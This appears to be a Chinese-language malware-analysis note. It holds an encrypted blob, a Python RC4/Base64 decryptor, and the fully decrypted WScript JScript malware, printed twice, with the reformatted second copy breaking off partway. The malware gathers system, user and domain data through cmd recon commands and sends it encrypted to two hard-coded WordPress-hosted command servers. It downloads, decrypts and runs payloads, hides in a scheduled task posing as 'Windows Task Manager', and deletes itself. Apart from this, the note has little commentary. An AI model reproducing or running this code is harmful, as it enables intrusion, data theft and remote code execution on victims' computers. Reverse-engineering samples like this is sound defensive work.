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'
key = 'EzZETcSXyKAdF_e5I2i1'

def MTvK(CgqD):
    &quot;&quot;&quot;Base64 字符到索引的映射（支持标准与 URL-safe）&quot;&quot;&quot;
    XwH7 = ord(CgqD[0])
    if XwH7 == 0x2B or XwH7 == 0x2D:   # '+' 或 '-'
        return 62
    if XwH7 == 0x2F or XwH7 == 0x5F:   # '/' 或 '_'
        return 63
    if XwH7 &lt; 0x30:
        return -1
    if XwH7 &lt; 0x30 + 10:               # '0'~'9'
        return XwH7 - 0x30 + 26 + 26
    if XwH7 &lt; 0x41 + 26:               # 'A'~'Z'
        return XwH7 - 0x41
    if XwH7 &lt; 0x61 + 26:               # 'a'~'z'
        return XwH7 - 0x61 + 26
    return -1

def LXv5(d27x):
    &quot;&quot;&quot;自定义 Base64 解码，返回字节列表（int）&quot;&quot;&quot;
    if len(d27x) % 4 &gt; 0:
        return
    CHlB = len(d27x)
    V8eR = 2 if d27x[CHlB - 2] == '=' else (1 if d27x[CHlB - 1] == '=' else 0)
    mjqo = [0] * (len(d27x) * 3 // 4 - V8eR)
    z8Ht = len(d27x) - 4 if V8eR &gt; 0 else len(d27x)
    t2JG = 0
    def XGH6(b0tQ):
        nonlocal t2JG
        mjqo[t2JG] = b0tQ
        t2JG += 1
    i = 0
    while i &lt; z8Ht:
        n6T8 = (MTvK(d27x[i]) &lt;&lt; 18) | (MTvK(d27x[i+1]) &lt;&lt; 12) | (MTvK(d27x[i+2]) &lt;&lt; 6) | MTvK(d27x[i+3])
        XGH6((n6T8 &amp; 0xFF0000) &gt;&gt; 16)
        XGH6((n6T8 &amp; 0xFF00) &gt;&gt; 8)
        XGH6(n6T8 &amp; 0xFF)
        i += 4
    if V8eR == 2:
        n6T8 = (MTvK(d27x[i]) &lt;&lt; 2) | (MTvK(d27x[i+1]) &gt;&gt; 4)
        XGH6(n6T8 &amp; 0xFF)
    elif V8eR == 1:
        n6T8 = (MTvK(d27x[i]) &lt;&lt; 10) | (MTvK(d27x[i+1]) &lt;&lt; 4) | (MTvK(d27x[i+2]) &gt;&gt; 2)
        XGH6((n6T8 &gt;&gt; 8) &amp; 0xFF)
        XGH6(n6T8 &amp; 0xFF)
    return mjqo

def CpPT(bOe3, F5vZ):
    &quot;&quot;&quot;RC4 加密/解密，F5vZ 为字节列表，返回明/密文字符串&quot;&quot;&quot;
    AWy7 = list(range(256))
    V2Vl = 0
    qyCq = 0
    mjqo = ''
    for i in range(256):
        V2Vl = (V2Vl + AWy7[i] + ord(bOe3[i % len(bOe3)])) % 256
        qyCq = AWy7[i]
        AWy7[i] = AWy7[V2Vl]
        AWy7[V2Vl] = qyCq
    i = 0
    V2Vl = 0
    for y in range(len(F5vZ)):
        i = (i + 1) % 256
        V2Vl = (V2Vl + AWy7[i]) % 256
        qyCq = AWy7[i]
        AWy7[i] = AWy7[V2Vl]
        AWy7[V2Vl] = qyCq
        mjqo += chr(F5vZ[y] ^ AWy7[(AWy7[i] + AWy7[V2Vl]) % 256])
    return mjqo

def main(cipher, key):
    cipher = LXv5(cipher)
    plain = CpPT(key, cipher)
    
    with open('C:\\Users\\HUAWEI\\Desktop\\病毒隔离区\\outII.txt', 'w') as out:
        out.write(plain)

if __name__ == '__main__':
    main(cipher, key)
得到文件

```javascript
function UspD(zDmy)

{var m3mH = WScript.CreateObject("ADODB.Stream")

m3mH.Type = 2;m3mH.CharSet = '437';m3mH.Open();m3mH.LoadFromFile(zDmy);var c0xi = m3mH.ReadText;m3mH.Close();return cz_b(c0xi);}var CKpR = new Array ("http://www.saipadiesel124.com/wp-content/plugins/imsanity/tmp.php","http://www.folk-cantabria.com/wp-content/plugins/wp-statistics/includes/classes/gallery_create_page_field.php");var tpO8 = "w3LxnRSbJcqf8HrU";var auME = new Array("systeminfo > ","net view >> ","net view /domain >> ","tasklist /v >> ","gpresult /z >> ","netstat -nao >> ","ipconfig /all >> ","arp -a >> ","net share >> ","net use >> ","net user >> ","net user administrator >> ","net user /domain >> ","net user administrator /domain >> ","set  >> ","dir %systemdrive%\x5cUsers\x5c*.* >> ","dir %userprofile%\x5cAppData\x5cRoaming\x5cMicrosoft\x5cWindows\x5cRecent\x5c*.* >> ","dir %userprofile%\x5cDesktop\x5c*.* >> ","tasklist /fi \x22modules eq wow64.dll\x22  >> ","tasklist /fi \x22modules ne wow64.dll\x22 >> ","dir \x22%programfiles(x86)%\x22 >> ","dir \x22%programfiles%\x22 >> ","dir %appdata% >>");var QUjy = new ActiveXObject("Scripting.FileSystemObject");var LIxF = WScript.ScriptName;var w5mY = "";var ruGx = TfOh();function hLit(XngP,y1qa)

{char_set = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";var Rj3c = "";var OKpB = "";for (var i = 0; i < XngP.length; ++i)

{var B8wU = XngP.charCodeAt(i);var LUxg = B8wU.toString(2);while (LUxg.length < (y1qa ? 8 : 16))

LUxg = "0" + LUxg;OKpB += LUxg;while (OKpB.length >= 6)

{var vjUu = OKpB.slice(0,6);OKpB = OKpB.slice(6);Rj3c += this.char_set.charAt(parseInt(vjUu,2));}}if (OKpB)

{while (OKpB.length < 6) OKpB += "0";Rj3c += this.char_set.charAt(parseInt(OKpB,2));}while (Rj3c.length % (y1qa ? 4 : 8) != 0)

Rj3c += "=";return Rj3c;}var b92A = [];b92A['C7']   = '80';b92A['FC']   = '81';b92A['E9']   = '82';b92A['E2']   = '83';b92A['E4']   = '84';b92A['E0']   = '85';b92A['E5']   = '86';b92A['E7']   = '87';b92A['EA']   = '88';b92A['EB']   = '89';b92A['E8']   = '8A';b92A['EF']   = '8B';b92A['EE']   = '8C';b92A['EC']   = '8D';b92A['C4']   = '8E';b92A['C5']   = '8F';b92A['C9']   = '90';b92A['E6']   = '91';b92A['C6']   = '92';b92A['F4']   = '93';b92A['F6']   = '94';b92A['F2']   = '95';b92A['FB']   = '96';b92A['F9']   = '97';b92A['FF']   = '98';b92A['D6']   = '99';b92A['DC']   = '9A';b92A['A2']   = '9B';b92A['A3']   = '9C';b92A['A5']   = '9D';b92A['20A7'] = '9E';b92A['192']  = '9F';b92A['E1']   = 'A0';b92A['ED']   = 'A1';b92A['F3']   = 'A2';b92A['FA']   = 'A3';b92A['F1']   = 'A4';b92A['D1']   = 'A5';b92A['AA']   = 'A6';b92A['BA']   = 'A7';b92A['BF']   = 'A8';b92A['2310'] = 'A9';b92A['AC']   = 'AA';b92A['BD']   = 'AB';b92A['BC']   = 'AC';b92A['A1']   = 'AD';b92A['AB']   = 'AE';b92A['BB']   = 'AF';b92A['2591'] = 'B0';b92A['2592'] = 'B1';b92A['2593'] = 'B2';b92A['2502'] = 'B3';b92A['2524'] = 'B4';b92A['2561'] = 'B5';b92A['2562'] = 'B6';b92A['2556'] = 'B7';b92A['2555'] = 'B8';b92A['2563'] = 'B9';b92A['2551'] = 'BA';b92A['2557'] = 'BB';b92A['255D'] = 'BC';b92A['255C'] = 'BD';b92A['255B'] = 'BE';b92A['2510'] = 'BF';b92A['2514'] = 'C0';b92A['2534'] = 'C1';b92A['252C'] = 'C2';b92A['251C'] = 'C3';b92A['2500'] = 'C4';b92A['253C'] = 'C5';b92A['255E'] = 'C6';b92A['255F'] = 'C7';b92A['255A'] = 'C8';b92A['2554'] = 'C9';b92A['2569'] = 'CA';b92A['2566'] = 'CB';b92A['2560'] = 'CC';b92A['2550'] = 'CD';b92A['256C'] = 'CE';b92A['2567'] = 'CF';b92A['2568'] = 'D0';b92A['2564'] = 'D1';b92A['2565'] = 'D2';b92A['2559'] = 'D3';b92A['2558'] = 'D4';b92A['2552'] = 'D5';b92A['2553'] = 'D6';b92A['256B'] = 'D7';b92A['256A'] = 'D8';b92A['2518'] = 'D9';b92A['250C'] = 'DA';b92A['2588'] = 'DB';b92A['2584'] = 'DC';b92A['258C'] = 'DD';b92A['2590'] = 'DE';b92A['2580'] = 'DF';b92A['3B1']  = 'E0';b92A['DF']   = 'E1';b92A['393']  = 'E2';b92A['3C0']  = 'E3';b92A['3A3']  = 'E4';b92A['3C3']  = 'E5';b92A['B5']   = 'E6';b92A['3C4']  = 'E7';b92A['3A6']  = 'E8';b92A['398']  = 'E9';b92A['3A9']  = 'EA';b92A['3B4']  = 'EB';b92A['221E'] = 'EC';b92A['3C6']  = 'ED';b92A['3B5']  = 'EE';b92A['2229'] = 'EF';b92A['2261'] = 'F0';b92A['B1']   = 'F1';b92A['2265'] = 'F2';b92A['2264'] = 'F3';b92A['2320'] = 'F4';b92A['2321'] = 'F5';b92A['F7']   = 'F6';b92A['2248'] = 'F7';b92A['B0']   = 'F8';b92A['2219'] = 'F9';b92A['B7']   = 'FA';b92A['221A'] = 'FB';b92A['207F'] = 'FC';b92A['B2']   = 'FD';b92A['25A0'] = 'FE';b92A['A0']   = 'FF';function TfOh()

{var ayuh = Math.ceil(Math.random()*10 + 25);var name = String.fromCharCode(Math.ceil(Math.random()*24 + 65));var dc9V = WScript.CreateObject("WScript.Network");w5mY = dc9V.UserName;for (var count = 0; count <ayuh ;count++ )

{switch (Math.ceil(Math.random()*3))

  {case 1: 

name = name + Math.ceil(Math.random()*8);      break;    case 2:

      	name = name + String.fromCharCode(Math.ceil(Math.random()*24 + 97));      break;    default:

        name = name + String.fromCharCode(Math.ceil(Math.random()*24 + 65));      break;  }}return name;}var wyKN = Blgx(bIdG());try

{var WE86 = bIdG();rGcR();jSm8();}catch(e)

{WScript.Quit();}function jSm8()

{var c9lr = Fv6b();while(true)

{for (var i = 0; i < CKpR.length; i++)

{var Ysyo = CKpR[i];var f3cb = XEWG(Ysyo,c9lr); 

switch (f3cb)

{case "good":				

    break;  case "exit": WScript.Quit();    break;  case "work": XBL3(Ysyo);    break;  case "fail": tbMu();    

    break;  default:

    break;}TfOh();}WScript.Sleep((Math.random()*300 + 3600) * 1000);}}function bIdG()

{var spq3= this['\u0041\u0063\u0074i\u0076eX\u004F\u0062j\u0065c\u0074'];var zBVv = new spq3('\u0057\u0053cr\u0069\u0070\u0074\u002E\u0053he\u006C\u006C');return zBVv;}function XBL3(B_TG)

{var YIme =  wyKN + LIxF.substring(0,LIxF.length - 2) + "pif";var Kpxo = new ActiveXObject("MSXML2.XMLHTTP");Kpxo.OPEN("post",B_TG,false);Kpxo.SETREQUESTHEADER("user-agent:","Mozilla/5.0 (Windows NT 6.1; Win64; x64); " + Sz8k());Kpxo.SETREQUESTHEADER("content-type:","application/octet-stream");Kpxo.SETREQUESTHEADER("content-length:","4");Kpxo.SEND("work");if (QUjy.FILEEXISTS(YIme))

{QUjy.DELETEFILE(YIme);}if (Kpxo.STATUS == 200)

{var m3mH = new ActiveXObject("ADODB.STREAM");m3mH.TYPE = 1;m3mH.OPEN();m3mH.WRITE(Kpxo.responseBody);m3mH.Position = 0;m3mH.Type = 2;m3mH.CharSet = "437";var c0xi = m3mH.ReadText(m3mH.Size);var ptF0 = FXx9("2f532d6baec3d0ec7b1f98aed4774843",cz_b(c0xi));NoRS(ptF0,YIme);       		m3mH.Close();}var ruGx = TfOh();c5ae(YIme,B_TG);WScript.Sleep(30000);QUjy.DELETEFILE(YIme);}function tbMu()

{QUjy.DELETEFILE(WScript.SCRIPTFULLNAME);eV_C("TaskManager","Windows Task Manager",w5mY,v_FileName,"EzZETcSXyKAdF_e5I2i1",wyKN,false);KhDn("TaskManager");WScript.Quit();}function XEWG(uXHK,hm2j)

{try

{var Kpxo = new ActiveXObject("MSXML2.XMLHTTP");Kpxo.OPEN("post",uXHK,false);Kpxo.SETREQUESTHEADER("user-agent:","Mozilla/5.0 (Windows NT 6.1; Win64; x64); " + Sz8k());Kpxo.SETREQUESTHEADER("content-type:","application/octet-stream");var rRi3 = hLit(hm2j,true);Kpxo.SETREQUESTHEADER("content-length:",rRi3.length);Kpxo.SEND(rRi3);return Kpxo.responseText;}catch(e)

{return "";}}function Sz8k()

{var n9mV ="";var dc9V = WScript.CreateObject("WScript.Network");var rRi3 = tpO8 + dc9V.ComputerName + w5mY;for (var i = 0; i < 16; i++)

{var YsXA = 0

for (var j = i; j < rRi3.length - 1; j++)

{YsXA = YsXA ^ rRi3.charCodeAt(j);}YsXA =(YsXA % 10);n9mV = n9mV + YsXA.toString(10);}n9mV = n9mV + tpO8;return n9mV;}function rGcR() 

{v_FileName =  wyKN + LIxF.substring(0,LIxF.length - 2) + "js";QUjy.COPYFILE(WScript.ScriptFullName,wyKN + LIxF);var HFp7 = (Math.random()*150 + 350) * 1000;WScript.Sleep(HFp7);eV_C("TaskManager","Windows Task Manager",w5mY,v_FileName,"EzZETcSXyKAdF_e5I2i1",wyKN,true);}function Fv6b()

{var m_Rr =  wyKN + "~dat.tmp";for (var i = 0; i < auME.length; i++)

{WE86.Run("cmd.exe /c " + auME[i] + "\x22" + m_Rr + "\x22",0,true); 

}var nRVN = UspD(m_Rr);WScript.Sleep(1000);QUjy.DELETEFILE(m_Rr);return FXx9("2f532d6baec3d0ec7b1f98aed4774843",nRVN);}function c5ae(YIme,B_TG)

{try

{if (QUjy.FILEEXISTS(YIme))

{WE86.Run("\x22" + YIme + "\x22" );}}catch(e)

{var Kpxo = new ActiveXObject("MSXML2.XMLHTTP");Kpxo.OPEN("post",B_TG,false);var ePMy = "error"; 

Kpxo.SETREQUESTHEADER("user-agent:","Mozilla/5.0 (Windows NT 6.1; Win64; x64); " + Sz8k());Kpxo.SETREQUESTHEADER("content-type:","application/octet-stream");Kpxo.SETREQUESTHEADER("content-length:",ePMy.length);Kpxo.SEND(ePMy);return "";}}function RPbY(r_X5)

{var w8rG="0123456789ABCDEF";var yjrw = w8rG.substr(r_X5 & 15,1);while(r_X5>15)

{r_X5 >>>= 4;yjrw = w8rG.substr(r_X5 & 15,1) + yjrw;}return yjrw;}function NptO(jlEi)

{return parseInt(jlEi,16);}function eV_C(Bjmr,RT6x,O7Ec,YBwP,T9Px,egNr,rmGH)

{try

{var BGfI = WScript.CreateObject("Schedule.Service");BGfI.Connect();var w2cQ = BGfI.GetFolder("WPD");var xSm3 = BGfI.NewTask(0);xSm3.Principal.UserId = O7Ec;xSm3.Principal.LogonType = 6;var wK2F = xSm3.RegistrationInfo;wK2F.Description = RT6x;wK2F.Author = O7Ec;var aYbx = xSm3.Settings;aYbx.Enabled = true;aYbx.StartWhenAvailable = true;aYbx.Hidden = rmGH;var oSP7 = "2015-07-12T11:47:24";var svaG = "2020-03-21T08:00:00";var LDoN = xSm3.Triggers;var r9EC = LDoN.Create(9);r9EC.StartBoundary = oSP7;r9EC.EndBoundary = svaG;r9EC.Id = "LogonTriggerId";r9EC.UserId = O7Ec;r9EC.Enabled = true;var gQu9 = xSm3.Actions.Create(0);gQu9.Path = YBwP;gQu9.Arguments = T9Px;gQu9.WorkingDirectory = egNr;w2cQ.RegisterTaskDefinition(Bjmr,xSm3,6,"","",3);return true;}catch(Err)	

{return false;}}function KhDn(Bjmr)

{try

{var UGgw = false;var BGfI = WScript.CreateObject("Schedule.Service");BGfI.Connect()




var w2cQ = BGfI.GetFolder("WPD");var FLs6 = w2cQ.GetTasks(0);if (FLs6.count >= 0) 

{var gk1H = new Enumerator(FLs6);for (; !gk1H.atEnd(); gk1H.moveNext())

{if (gk1H.item().name == Bjmr)

{w2cQ.DeleteTask(Bjmr,0);UGgw = true;}}}}catch(Err)

{return false;}}function cz_b(S3Ws)

{var n9mV = [];var mvAu = S3Ws.length;for (var i = 0; i < mvAu; i++)

{var wtVX = S3Ws.charCodeAt(i);if(wtVX >= 128)

{var h = b92A['' + RPbY(wtVX)];wtVX = NptO(h);}n9mV.push(wtVX);}return n9mV;}function NoRS(ExY2,igeK)

{var m3mH = WScript.CreateObject("ADODB.Stream");m3mH.type = 2;m3mH.Charset = "iso-8859-1";m3mH.Open();m3mH.WriteText(ExY2);m3mH.Flush();m3mH.Position = 0;m3mH.SaveToFile(igeK,2);m3mH.close();}function Blgx(gaWo)

{wyKN = "c:\x5cUsers\x5c" + w5mY + "\x5cAppData\x5cLocal\x5cMicrosoft\x5cWindows\x5c";if (! QUjy.FOLDEREXISTS(wyKN)) 

wyKN = "c:\x5cUsers\x5c" + w5mY + "\x5cAppData\x5cLocal\x5cTemp\x5c";if (! QUjy.FOLDEREXISTS(wyKN)) 

wyKN = "c:\x5cDocuments and Settings\x5c" + w5mY + "\x5cApplication Data\x5cMicrosoft\x5cWindows\x5c";return wyKN

}function FXx9(Z_3F,VMd7)

{var NNSX = [];var JDro = 0;var KagY;var n9mV = '';for (var i = 0; i < 256; i++)

{NNSX[i] = i;}for (var i = 0; i < 256; i++)

{JDro = (JDro + NNSX[i] + Z_3F.charCodeAt(i % Z_3F.length)) % 256;KagY = NNSX[i];NNSX[i] = NNSX[JDro];NNSX[JDro] = KagY;}var i = 0;var JDro = 0;for (var y = 0; y < VMd7.length; y++)

{i = (i + 1) % 256;JDro = (JDro + NNSX[i]) % 256;KagY = NNSX[i];NNSX[i] = NNSX[JDro];NNSX[JDro] = KagY;n9mV += String.fromCharCode(VMd7[y] ^ NNSX[(NNSX[i] + NNSX[JDro]) % 256]);}return n9mV;}

```

我让ds帮我格式化了一下function UspD(zDmy) {
  var m3mH = WScript.CreateObject(&quot;ADODB.Stream&quot;);
  m3mH.Type = 2;
  m3mH.CharSet = '437';
  m3mH.Open();
  m3mH.LoadFromFile(zDmy);
  var c0xi = m3mH.ReadText;
  m3mH.Close();
  return cz_b(c0xi);
}

var CKpR = new Array(
  &quot;http://www.saipadiesel124.com/wp-content/plugins/imsanity/tmp.php&quot;,
  &quot;http://www.folk-cantabria.com/wp-content/plugins/wp-statistics/includes/classes/gallery_create_page_field.php&quot;
);
var tpO8 = &quot;w3LxnRSbJcqf8HrU&quot;;
var auME = new Array(
  &quot;systeminfo &gt; &quot;,
  &quot;net view &gt;&gt; &quot;,
  &quot;net view /domain &gt;&gt; &quot;,
  &quot;tasklist /v &gt;&gt; &quot;,
  &quot;gpresult /z &gt;&gt; &quot;,
  &quot;netstat -nao &gt;&gt; &quot;,
  &quot;ipconfig /all &gt;&gt; &quot;,
  &quot;arp -a &gt;&gt; &quot;,
  &quot;net share &gt;&gt; &quot;,
  &quot;net use &gt;&gt; &quot;,
  &quot;net user &gt;&gt; &quot;,
  &quot;net user administrator &gt;&gt; &quot;,
  &quot;net user /domain &gt;&gt; &quot;,
  &quot;net user administrator /domain &gt;&gt; &quot;,
  &quot;set  &gt;&gt; &quot;,
  &quot;dir %systemdrive%\\Users\\*.* &gt;&gt; &quot;,
  &quot;dir %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\*.* &gt;&gt; &quot;,
  &quot;dir %userprofile%\\Desktop\\*.* &gt;&gt; &quot;,
  &quot;tasklist /fi \&quot;modules eq wow64.dll\&quot;  &gt;&gt; &quot;,
  &quot;tasklist /fi \&quot;modules ne wow64.dll\&quot; &gt;&gt; &quot;,
  &quot;dir \&quot;%programfiles(x86)%\&quot; &gt;&gt; &quot;,
  &quot;dir \&quot;%programfiles%\&quot; &gt;&gt; &quot;,
  &quot;dir %appdata% &gt;&gt;&quot;
);
var QUjy = new ActiveXObject(&quot;Scripting.FileSystemObject&quot;);
var LIxF = WScript.ScriptName;
var w5mY = &quot;&quot;;
var ruGx = TfOh();

function hLit(XngP, y1qa) {
  char_set = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;;
  var Rj3c = &quot;&quot;;
  var OKpB = &quot;&quot;;
  for (var i = 0; i &lt; XngP.length; ++i) {
    var B8wU = XngP.charCodeAt(i);
    var LUxg = B8wU.toString(2);
    while (LUxg.length &lt; (y1qa ? 8 : 16))
      LUxg = &quot;0&quot; + LUxg;
    OKpB += LUxg;
    while (OKpB.length &gt;= 6) {
      var vjUu = OKpB.slice(0, 6);
      OKpB = OKpB.slice(6);
      Rj3c += this.char_set.charAt(parseInt(vjUu, 2));
    }
  }
  if (OKpB) {
    while (OKpB.length &lt; 6)
      OKpB += &quot;0&quot;;
    Rj3c += this.char_set.charAt(parseInt(OKpB, 2));
  }
  while (Rj3c.length % (y1qa ? 4 : 8) != 0)
    Rj3c += &quot;=&quot;;
  return Rj3c;
}

var b92A = [];
b92A['C7'] = '80';
b92A['FC'] = '81';
b92A['E9'] = '82';
b92A['E2'] = '83';
b92A['E4'] = '84';
b92A['E0'] = '85';
b92A['E5'] = '86';
b92A['E7'] = '87';
b92A['EA'] = '88';
b92A['EB'] = '89';
b92A['E8'] = '8A';
b92A['EF'] = '8B';
b92A['EE'] = '8C';
b92A['EC'] = '8D';
b92A['C4'] = '8E';
b92A['C5'] = '8F';
b92A['C9'] = '90';
b92A['E6'] = '91';
b92A['C6'] = '92';
b92A['F4'] = '93';
b92A['F6'] = '94';
b92A['F2'] = '95';
b92A['FB'] = '96';
b92A['F9'] = '97';
b92A['FF'] = '98';
b92A['D6'] = '99';
b92A['DC'] = '9A';
b92A['A2'] = '9B';
b92A['A3'] = '9C';
b92A['A5'] = '9D';
b92A['20A7'] = '9E';
b92A['192'] = '9F';
b92A['E1'] = 'A0';
b92A['ED'] = 'A1';
b92A['F3'] = 'A2';
b92A['FA'] = 'A3';
b92A['F1'] = 'A4';
b92A['D1'] = 'A5';
b92A['AA'] = 'A6';
b92A['BA'] = 'A7';
b92A['BF'] = 'A8';
b92A['2310'] = 'A9';
b92A['AC'] = 'AA';
b92A['BD'] = 'AB';
b92A['BC'] = 'AC';
b92A['A1'] = 'AD';
b92A['AB'] = 'AE';
b92A['BB'] = 'AF';
b92A['2591'] = 'B0';
b92A['2592'] = 'B1';
b92A['2593'] = 'B2';
b92A['2502'] = 'B3';
b92A['2524'] = 'B4';
b92A['2561'] = 'B5';
b92A['2562'] = 'B6';
b92A['2556'] = 'B7';
b92A['2555'] = 'B8';
b92A['2563'] = 'B9';
b92A['2551'] = 'BA';
b92A['2557'] = 'BB';
b92A['255D'] = 'BC';
b92A['255C'] = 'BD';
b92A['255B'] = 'BE';
b92A['2510'] = 'BF';
b92A['2514'] = 'C0';
b92A['2534'] = 'C1';
b92A['252C'] = 'C2';
b92A['251C'] = 'C3';
b92A['2500'] = 'C4';
b92A['253C'] = 'C5';
b92A['255E'] = 'C6';
b92A['255F'] = 'C7';
b92A['255A'] = 'C8';
b92A['2554'] = 'C9';
b92A['2569'] = 'CA';
b92A['2566'] = 'CB';
b92A['2560'] = 'CC';
b92A['2550'] = 'CD';
b92A['256C'] = 'CE';
b92A['2567'] = 'CF';
b92A['2568'] = 'D0';
b92A['2564'] = 'D1';
b92A['2565'] = 'D2';
b92A['2559'] = 'D3';
b92A['2558'] = 'D4';
b92A['2552'] = 'D5';
b92A['2553'] = 'D6';
b92A['256B'] = 'D7';
b92A['256A'] = 'D8';
b92A['2518'] = 'D9';
b92A['250C'] = 'DA';
b92A['2588'] = 'DB';
b92A['2584'] = 'DC';
b92A['258C'] = 'DD';
b92A['2590'] = 'DE';
b92A['2580'] = 'DF';
b92A['3B1'] = 'E0';
b92A['DF'] = 'E1';
b92A['393'] = 'E2';
b92A['3C0'] = 'E3';
b92A['3A3'] = 'E4';
b92A['3C3'] = 'E5';
b92A['B5'] = 'E6';
b92A['3C4'] = 'E7';
b92A['3A6'] = 'E8';
b92A['398'] = 'E9';
b92A['3A9'] = 'EA';
b92A['3B4'] = 'EB';
b92A['221E'] = 'EC';
b92A['3C6'] = 'ED';
b92A['3B5'] = 'EE';
b92A['2229'] = 'EF';
b92A['2261'] = 'F0';
b92A['B1'] = 'F1';
b92A['2265'] = 'F2';
b92A['2264'] = 'F3';
b92A['2320'] = 'F4';
b92A['2321'] = 'F5';
b92A['F7'] = 'F6';
b92A['2248'] = 'F7';
b92A['B0'] = 'F8';
b92A['2219'] = 'F9';
b92A['B7'] = 'FA';
b92A['221A'] = 'FB';
b92A['207F'] = 'FC';
b92A['B2'] = 'FD';
b92A['25A0'] = 'FE';
b92A['A0'] = 'FF';

function TfOh() {
  var ayuh = Math.ceil(Math.random() * 10 + 25);
  var name = String.fromCharCode(Math.ceil(Math.random() * 24 + 65));
  var dc9V = WScript.CreateObject(&quot;WScript.Network&quot;);
  w5mY = dc9V.UserName;
  for (var count = 0; count &lt; ayuh; count++) {
    switch (Math.ceil(Math.random() * 3)) {
      case 1:
        name = name + Math.ceil(Math.random() * 8);
        break;
      case 2:
        name = name + String.fromCharCode(Math.ceil(Math.random() * 24 + 97));
        break;
      default:
        name = name + String.fromCharCode(Math.ceil(Math.random() * 24 + 65));
        break;
    }
  }
  return name;
}

var wyKN = Blgx(bIdG());
try {
  var WE86 = bIdG();
  rGcR();
  jSm8();
